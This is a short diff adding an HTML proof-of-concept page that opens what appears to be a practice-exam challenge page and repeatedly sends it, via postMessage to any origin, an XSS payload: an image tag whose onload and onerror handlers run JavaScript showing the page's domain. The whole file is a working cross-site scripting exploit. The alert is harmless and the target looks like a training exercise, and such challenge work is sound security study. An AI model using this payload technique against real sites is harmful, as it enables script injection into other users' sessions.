@@ -1,0 +1,11 @@
+<h1 id="msg">Loading...</h1>
+
+<script>
+	const targetURL = "https://preben.net/mockexam/challenge4.php";
+	const targetWindow = window.open(targetURL);
+
+	setInterval(() => {
+		targetWindow.postMessage(`<img src="https://pxl.rip/x" onload="alert('Postmessage' + document.domain)" onerror="alert('Postmessage' + document.domain)"/>`, "*");
+	}, 1000);
+
+</script>
